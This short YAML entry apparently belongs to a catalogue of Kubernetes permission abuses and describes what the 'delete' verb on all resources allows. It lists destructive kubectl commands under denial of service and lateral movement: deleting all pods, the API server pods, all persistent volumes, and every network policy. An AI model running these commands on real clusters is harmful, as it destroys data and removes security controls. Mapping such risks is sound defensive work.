---
verb: "delete"
resource: "*"
description: "Delete Kubernetes resources"
exploits:
  - type: "Denial of Service"
    description: "Delete critical resources to disrupt cluster operations"
    code: |
      # Delete all pods in namespace
      kubectl delete pods --all -n target-namespace
      
      # Delete critical system pods
      kubectl delete pod -n kube-system --selector=component=kube-apiserver
      
      # Delete persistent volumes
      kubectl delete pv --all
      
      # Delete network policies (remove security controls)
      kubectl delete networkpolicy --all --all-namespaces
      
  - type: "Lateral Movement"
    description: "Delete network policies to remove network separation."
    code: |
      # Delete network policies (remove security controls)
      kubectl delete networkpolicy --all --all-namespaces
---